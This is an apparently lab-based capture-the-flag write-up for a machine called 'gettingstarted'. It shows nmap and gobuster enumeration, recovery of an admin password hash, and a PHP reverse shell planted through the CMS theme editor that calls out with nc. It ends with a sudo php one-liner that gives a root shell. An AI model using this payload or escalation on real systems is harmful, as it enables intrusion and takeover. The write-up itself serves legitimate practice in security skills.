 ```nmap -sV -sC gettingstarted.htb
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-21 17:52 +0545
Nmap scan report for gettingstarted.htb (10.129.173.75)
Host is up (0.31s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE    SERVICE   VERSION
22/tcp   open     ssh       OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp   open     http      Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/admin/
|_http-title: Welcome to GetSimple! - gettingstarted
|_http-server-header: Apache/2.4.41 (Ubuntu)
6025/tcp filtered x11
6901/tcp filtered jetstream
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.54 seconds
```

```bash
╭─[~]─[at0m@heker]─[0]─[3982]
╰─[:)] % gobuster dir -u http://10.129.209.255/ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.209.255/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
Progress: 469 / 4745 (9.88%)
/admin                (Status: 301) [Size: 316] [--> http://10.129.209.255/admin/]
/backups              (Status: 301) [Size: 318] [--> http://10.129.209.255/backups/]
/data                 (Status: 301) [Size: 315] [--> http://10.129.209.255/data/]
/index.php            (Status: 200) [Size: 5485]
```
we found admin credentials in /data/users/admin.xml and the password was a hash so the password was cracked using crackstation and the password is `admin`.

http://gettingstarted.htb/admin/theme-edit.php
going to theme edit php then editing it with 
```
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.242 9443 >/tmp/f"); ?>
```

then we get a shell boom,
we see sudo -l 
```

sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

so we do sudo /usr/bin/php -r 'system("/bin/bash");'
we get root shell boom
